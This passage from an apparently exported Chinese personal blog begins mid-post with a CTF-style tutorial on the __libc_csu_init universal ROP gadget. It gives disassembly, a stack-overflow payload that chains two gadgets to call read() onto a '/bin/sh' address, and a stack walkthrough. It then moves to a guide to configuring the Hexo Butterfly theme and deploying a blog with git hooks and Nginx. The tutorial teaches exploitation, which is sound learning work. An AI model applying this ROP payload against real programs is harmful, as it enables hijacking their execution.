class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line">   <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line">   <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line">   <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line">   <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line">   <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line">   <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line">   <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>从中提取出两段（必须以ret结尾），把它们叫做 rop1 和 rop2：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"><span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"><span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"><span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"><span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"><span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"><span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line"> <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line"> <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line"> <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line"> <span class="number">0x000000000040081d</span> &lt;+<span class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line"> <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line"> <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line"> <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"> <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"> <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"> <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"> <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"> <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"> <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>

<p>我们可以看到rop1 中连续六个 pop，可以将栈顶的六个值传入pop rbx_rbp_r12_r13_r14_r15</p>
<p>rop2中可以传递寄存器的值rdx(r13), rsi(r14), edi(r15d)</p>
<p>rdi,rsi,rdx正好是64位传参的前三个寄存器<br>因此我们可以借此gadget给某个函数传入参数控制程序，接下来我分析一下利用gadget的流程。</p>
<p>用我最近做的一个题的payload来说明<br>payload如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line"> + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)+</span><br><span class="line"> + p64(rop2)+<span class="string">"\x00"</span> * <span class="number">56</span>+p64(start_addr)+payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br></pre></td></tr></table></figure>

<p>首先是栈溢出到函数返回地址，填充为rop1的地址,后面加上六个参数，再加上rop2,再填充56个字节，最后加上函数start的地址。后面填充’a’到200完成payload的输入</p>
<p>仔细阅读rop1和rop2的汇编代码了解程序流程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">有个地方思考时很容易乱，就是程序执行流eip指向执行的是代码段，但是是在栈里对数据进行处理的。</span><br></pre></td></tr></table></figure>

<p>首先payload输入后，执行rop1的汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ret指令会 </span><br><span class="line"></span><br><span class="line">将rsp加<span class="number">8</span> 则rsp会指向p64(<span class="number">0</span>)		即覆盖的第一个参数</span><br><span class="line"></span><br><span class="line">将函数返回地址传给eip </span><br><span class="line"></span><br><span class="line">eip指向函数返回地址，即rop1的地址，</span><br><span class="line">程序开始执行rop1里的汇编代码</span><br></pre></td></tr></table></figure>

<p>由rop1可知pop指令将参数传给各个寄存器中<br>每次将栈里数据pop后rsp都会加上8<br>如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rbx &lt;-- <span class="number">0</span></span><br><span class="line">rbp &lt;-- <span class="number">1</span></span><br><span class="line">r12 &lt;-- read_got</span><br><span class="line">r13 &lt;-- <span class="number">8</span></span><br><span class="line">r14 &lt;-- binsh_addr</span><br><span class="line">r15 &lt;-- <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>此时rsp指向了rop2，<br>同样的，rop1的ret指令将</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eip &lt;-- rop2的地址</span><br><span class="line">rsp+=<span class="number">8</span>;	指向了填充的<span class="number">56</span>*<span class="string">'a'</span></span><br></pre></td></tr></table></figure>

<p>开始执行rop2的汇编代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rdx &lt;-- r15 &lt;-- <span class="number">1</span></span><br><span class="line">rsi &lt;-- r14 &lt;-- binsh_addr</span><br><span class="line">edi &lt;-- r13 &lt;-- <span class="number">8</span></span><br><span class="line">将这三个参数传入了前三个寄存器中</span><br><span class="line">call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">这句汇编就可以调用r12里的函数地址并将 上面寄存器的参数传给此函数</span><br></pre></td></tr></table></figure>

<p>可以知道payload的调用函数为第三个参数<br>传入函数的三个参数<br>分别在payload传入的第6，5，4个参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">接着</span><br><span class="line">add    rbx,<span class="number">0x1</span>  （rbx=<span class="number">1</span>）</span><br><span class="line">cmp    rbp,rbx   (rbp=<span class="number">1</span>,rbx=<span class="number">1</span>)</span><br><span class="line">jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"><span class="comment">//有下面的指令解释可以知道相等不跳转</span></span><br><span class="line">所以继续执行下面的汇编</span><br><span class="line">add    rsp,<span class="number">0x8</span></span><br><span class="line">pop    rbx</span><br><span class="line">   pop    rbp</span><br><span class="line">   pop    r12</span><br><span class="line">   pop    r13</span><br><span class="line">   pop    r14</span><br><span class="line">   pop    r15</span><br><span class="line">这几句将rsp+<span class="number">7</span>*<span class="number">8</span>就是加上了<span class="number">56</span></span><br><span class="line">由payload知道，此时rsp正好跳过了<span class="number">56</span>*<span class="string">'a'</span>指向了start函数的地址</span><br><span class="line">最后ret指令</span><br><span class="line">eip &lt;-- start地址</span><br></pre></td></tr></table></figure>

<p>到这里通用gadget完成了一次调用</p>
<p>  这个payload的作用就是调用了read函数读取内容到要填写binsh的地址<br>并重新执行函数start</p>
<p>下面附上我手画的一张栈空间结构图，可以根据这个分析一下流程！</p>
<p><img alt data-src="/2019/11/01/通用gadget原理分析/1.jpg" class="lazyload"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn学习</tag>
      </tags>
  </entry>
  <entry>
    <title>链接</title>
    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>hexo Butterfly主题配置及部署到服务器</title>
    <url>/2020/04/06/hexo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="安装Butterfly主题与配置"><a href="#安装Butterfly主题与配置" class="headerlink" title="安装Butterfly主题与配置"></a>安装Butterfly主题与配置</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">这个主题还是很不错的，我花了一个多礼拜的时间来搞。</span><br><span class="line">说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错</span><br></pre></td></tr></table></figure>

<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" target="_blank" rel="noopener">资源链接</a> </p>
<p>直接点击下载比git clone要快的多，下载后解压到<code>hexo themes</code>目录下</p>
<blockquote>
<p>我主要将一些问题，配置说一下，要具体配置看<strong>相关博文链接</strong></p>
</blockquote>
<h2 id="hexo各目录作用"><a href="#hexo各目录作用" class="headerlink" title="hexo各目录作用"></a>hexo各目录作用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml      <span class="comment">// 站点配置文件</span></span><br><span class="line">├── db.json          <span class="comment">// 缓存文件</span></span><br><span class="line">├── node_modules     <span class="comment">// 安装的插件以及hexo所需的一些nodejs模块</span></span><br><span class="line">├── package.json     <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scaffolds        <span class="comment">// 模版文件	</span></span><br><span class="line">	-draft.md						</span><br><span class="line">	-page.md						</span><br><span class="line">	-post.md</span><br><span class="line">├── source           <span class="comment">// 源文件，用来存放你的文章 md 文件</span></span><br><span class="line">	-_posts</span><br><span class="line">└── themes           <span class="comment">// 主题文件</span></span><br></pre></td></tr></table></figure>

<p>hexo new <file> 默认是post.md，一般放在source中<code>_posts</code>目录，我们写作的博客都在这里。</file></p>
<p>​    可以在<code>post.md</code>中设置自动生成的博客的格式</p>
<p>主题下载到themes目录下</p>
<h2 id="主题目录"><a href="#主题目录" class="headerlink" title="主题目录"></a>主题目录</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.en.md       <span class="comment">// READEME 英文版</span></span><br><span class="line">├── README.md          <span class="comment">// READEME 中文文件</span></span><br><span class="line">├── _config.yml        <span class="comment">// 主题配置文件</span></span><br><span class="line">├── languages         <span class="comment">// 多语言配置文件 可以在hexo的_config.yml中配置</span></span><br><span class="line">├── layout            <span class="comment">// 模板文件</span></span><br><span class="line">├── package.json      <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scripts           <span class="comment">// 主题的脚本文件</span></span><br><span class="line">├── source            <span class="comment">// 主题的资源文件 CSS IMG</span></span><br></pre></td></tr></table></figure>

<h2 id="Hexo-的工作原理"><a href="#Hexo-的工作原理" class="headerlink" title="Hexo 的工作原理"></a>Hexo 的工作原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo g：</span><br><span class="line">    生成静态文件。</span><br><span class="line">    将我们的数据和界面相结合生成静态文件的过程。</span><br><span class="line">    会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 <span class="keyword">public</span> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。</span><br><span class="line">hexo d：</span><br><span class="line">    部署文件。</span><br><span class="line">    部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 <span class="keyword">public</span> 文件上传至 github 或者 coding 中。</span><br><span class="line">    然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 <span class="keyword">public</span> 文件上传至你自己的服务器上。</span><br></pre></td></tr></table></figure>

<p>hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问</p>
<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><h3 id="菜单的配置"><a href="#菜单的配置" class="headerlink" title="菜单的配置"></a>菜单的配置</h3><p><img alt data-src="https://i.loli.net/2020/04/06/FEwlX7jhDmV4oAq.png" class="lazyload"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:前面是显示的菜单名称</span><br><span class="line">|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io </span><br><span class="line">列表下面那种是分级目录</span><br></pre></td></tr></table></figure>

<h3 id="创建page-tag等"><a href="#创建page-tag等" class="headerlink" title="创建page tag等"></a>创建page tag等</h3><p>刚开始，标签，分类，友链等都是没有界面的，所以用到命令</p>
<p> <code>hexo new page &#39;name&#39;</code></p>
<p>在hexo主目录中输入命令，会在<code>source</code>下出现相应目录</p>
<p><code>tags</code>的配置</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-04-03 16:20:50</span><br><span class="line">type: "tags"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>

<p>top_img可以设置对应菜单下的图片,可以用图床生成图片链接</p>
<p><code>link</code>的配置</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: link</span><br><span class="line">date: 2020-04-05 17:34:13</span><br><span class="line">type: "link"</span><br><span class="line">top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png</span><br></pre></td></tr></table></figure>

<p><code>categories</code>的配置</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-04-03 16:20:21</span><br><span class="line">type: "categories"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>

<h3 id="友链的设置"><a href="#友链的设置" class="headerlink" title="友链的设置"></a>友链的设置</h3><p>在hexo的source目录生成 <code>_data</code>里面生成<code>link.yml</code>文件</p>
<p>文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:</span></span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">      name: <span class="comment">#名称</span></span><br><span class="line">      link: <span class="comment">#博客链接</span></span><br><span class="line">      avatar: <span class="comment">#头像</span></span><br><span class="line">      descr: <span class="comment">#描述</span></span><br><span class="line">    <span class="number">2</span>:</span><br><span class="line">      name:</span><br><span class="line">      link: </span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br></pre></td></tr></table></figure>

<p>另外在主题的配置文件中Flink下设置自己的资料</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 友情鏈接界面設置</span><br><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字： zzl14</span><br><span class="line">  address: Blog 地址： https:<span class="comment">//www.zzl14.xyz/link/</span></span><br><span class="line">  avatar: Blog 主题： Butterfly</span><br><span class="line">  info: Blog 简介： 日常学习总结</span><br><span class="line">  comment: 交换友链,请留言</span><br></pre></td></tr></table></figure>

<p>界面如下<img alt="QQ截图20200406151505.png" data-src="https://i.loli.net/2020/04/06/TsqmJpDIulwQeCF.png" class="lazyload"></p>
<h3 id="文章的图片设置"><a href="#文章的图片设置" class="headerlink" title="文章的图片设置"></a>文章的图片设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">category: &#123;&#123; category &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">top_img: <span class="comment">#文章顶部图片路径</span></span><br><span class="line">cover: <span class="comment">#封面路径</span></span><br></pre></td></tr></table></figure>

<h3 id="搜索框的设置"><a href="#搜索框的设置" class="headerlink" title="搜索框的设置"></a>搜索框的设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true <span class="comment">#主题配置中设置为true,并在hexo主目录使用如下命令下载依赖，</span></span><br><span class="line">    </span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>具体配置过程可能艰辛，但是慢慢来。</p>
<h1 id="相关博文链接"><a href="#相关博文链接" class="headerlink" title="相关博文链接"></a>相关博文链接</h1><p><a href="https://ciweigg2.github.io/2019/07/04/hexo-theme-butterfly-zhu-ti-an-zhuang-ya/#toc-heading-5" target="_blank" rel="noopener">详细博文1</a></p>
<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/#%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95" target="_blank" rel="noopener">详细博文2</a></p>
<p><a href="http://yearito.cn/posts/hexo-get-started.html" target="_blank" rel="noopener">系列博文</a></p>
<h1 id="hexo部署到服务器"><a href="#hexo部署到服务器" class="headerlink" title="hexo部署到服务器"></a>hexo部署到服务器</h1><p>由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。</p>
<p>但是之后感觉其实没有太大必要</p>
<p>先放一幅原理图（<a href="https://www.jianshu.com/p/e1ccd49b4e5d" target="_blank" rel="noopener">别人博客</a>的）</p>
<p><img alt data-src="https://i.loli.net/2020/04/06/GPlK9CujERi4mk3.png" class="lazyload"></p>
<p>所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站</p>
<p>大致思路是</p>
<p>1.本地上传到服务器的git仓库</p>
<p>2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置）</p>
<p>3.通过Nginx将网站根目录的内容在公网ip进行展示</p>
<blockquote>
<p>安装nginx</p>
<p>创建git用户</p>
</blockquote>
<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@ip		#登录服务器</span><br><span class="line"></span><br><span class="line">sudo apt-get install nginx	(有时要用到 sudo apt-get update)</span><br><span class="line"><span class="meta">	#</span><span class="bash"> 或者</span></span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>

<h2 id="新建git用户"><a href="#新建git用户" class="headerlink" title="新建git用户"></a>新建git用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo adduser git		#新建git用户，下面会输入</span><br></pre></td></tr></table></figure>

<h3 id="建立服务器端git仓库"><a href="#建立服务器端git仓库" class="headerlink" title="建立服务器端git仓库"></a>建立服务器端git仓库</h3><blockquote>
<p>可以在hexo bash上上传到仓库</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /zzl   # 创建个人git目录</span><br><span class="line">$ cd /zzl</span><br><span class="line">$ sudo mkdir blog.git  # 创建仓库</span><br><span class="line">$ cd blog.git</span><br><span class="line">$ sudo git init --bare # 初始化仓库</span><br></pre></td></tr></table></figure>

<h3 id="建立网站根目录"><a href="#建立网站根目录" class="headerlink" title="建立网站根目录"></a>建立网站根目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /home/git/hexo</span></span><br></pre></td></tr></table></figure>

<h3 id="改目录权限"><a href="#改目录权限" class="headerlink" title="改目录权限"></a>改目录权限</h3><blockquote>
<p>因为在hexo的配置文件中repo选项是通过git进行上传</p>
<p>所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /zzl /home/git/hexochmod -R git 775</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod -R git 775</span></span><br></pre></td></tr></table></figure>

<h3 id="编辑hook函数"><a href="#编辑hook函数" class="headerlink" title="编辑hook函数"></a>编辑hook函数</h3><blockquote>
<p>将上传到仓库的文件转到网站根目录</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /zzl/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>

<p>填入以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f</span><br></pre></td></tr></table></figure>

<h3 id="在本地hexo-bash测试"><a href="#在本地hexo-bash测试" class="headerlink" title="在本地hexo bash测试"></a>在本地hexo bash测试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:/zzl/blog.git</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果提示你克隆了一个空仓库，代表成功</p>
<p>但是每次都要输入密码才能上传</p>
<p>这时候我们就要用到<code>rsa</code>加密进行身份验证，以后就不用输入密码</p>
</blockquote>
<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git  #进到git目录</span><br><span class="line">su git    //切换git用户</span><br><span class="line">mkdir /home/git/.ssh  </span><br><span class="line">vi /home/git/.ssh/authorized_keys	#输入公钥</span><br></pre></td></tr></table></figure>

<p>在之前的hexo与github仓库绑定时应该已经生成过</p>
<p>我们可以再生成一次用来查看密钥位置</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>会发现目录下有<code>id_rsa.pub</code>即公钥</p>
<p>将公钥内容输入<code>/home/git/.ssh/authorized_keys</code></p>
<blockquote>
<p>最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功</p>
</blockquote>
<p><code>ssh git@ip</code></p>
<h2 id="配置网站根目录"><a href="#配置网站根目录" class="headerlink" title="配置网站根目录"></a>配置网站根目录</h2><p><code>nginx -t //查看nginx配置文件位置</code></p>
<ul>
<li>ubuntu</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>

<ul>
<li><p>centos</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure>



</li>
</ul>
<blockquote>
<p>不同版本的nginx或系统，nginx的配置文件不一定相同</p>
</blockquote>
<p>如果文件中有以下内容，就找对了文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径</span><br><span class="line">    server_name laoyuyu.me www.laoyuyu.me;  # 如果需要改域名访问，修改server_name 为域名便可</span><br><span class="line">    location / &#123;</span><br><span class="line">            # First attempt to serve request as file, then</span><br><span class="line">            # as directory, then fall back to displaying a 404.</span><br><span class="line">            try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最后重启服务，让NGINX生效"><a href="#最后重启服务，让NGINX生效" class="headerlink" title="最后重启服务，让NGINX生效"></a>最后重启服务，让NGINX生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>

<p>此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。</p>
<p>编辑<code>hexo _config.yml</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git <span class="comment">#用户名</span></span><br><span class="line">repo: git@ip:/zzl/blog.git <span class="comment">#Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径</span></span><br><span class="line">branch: master <span class="comment">#分支，由于我们只用Git进行发布，master即可。</span></span><br></pre></td></tr></table></figure>

<p><code>hexo d</code>上传之后再访问ip就可以了</p>
<p>最后说一下git用户的权限更改</p>
<h1 id="为了安全考虑-更改GIT用户的SHELL-权限"><a href="#为了安全考虑-更改GIT用户的SHELL-权限" class="headerlink" title="为了安全考虑,更改GIT用户的SHELL 权限"></a>为了安全考虑,更改GIT用户的SHELL 权限</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which git-shell  #返回git-shell的安装目录，如：/usr/bin/git-shell</span><br><span class="line">cat /etc/shells	#如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径</span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/git-shell # 添加你的git-shell</span><br></pre></td></tr></table></figure>

<p><code>vim /etc/passwd</code></p>
<p>找到类似<code>/home/git:/bin/bash</code></p>
<p>更改<code>/bin/bash</code>修改为<code>/usr/bin/git-shell</code></p>
<blockquote>
<p>千万不要将root的<code>/bin/bash</code>修改，否则之后服务器就无法登录</p>
</blockquote>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>配置挺难，但最后总算学到了什么。</p>
<blockquote>
<p>配置hexo到服务器的链接</p>
</blockquote>
<ul>
<li><a href="http://roclinux.cn/?p=2551" target="_blank" rel="noopener">ssh相关</a></li>
<li><a href="http://taqini.space/2020/02/12/start-with-hexo/#%E6%89%A7%E8%A1%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4-1" target="_blank" rel="noopener">博文一</a></li>
<li><a href="https://www.laoyuyu.me/2017/10/10/hexo_deploy_vps/" target="_blank" rel="noopener">博文2</a></li>
<li><a href="https://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/" target="_blank" rel="noopener">博文3</a></li>
<li><a href="https://segmentfault.com/a/1190000005723321" target="_blank" rel="noopener">博文4</a></li>
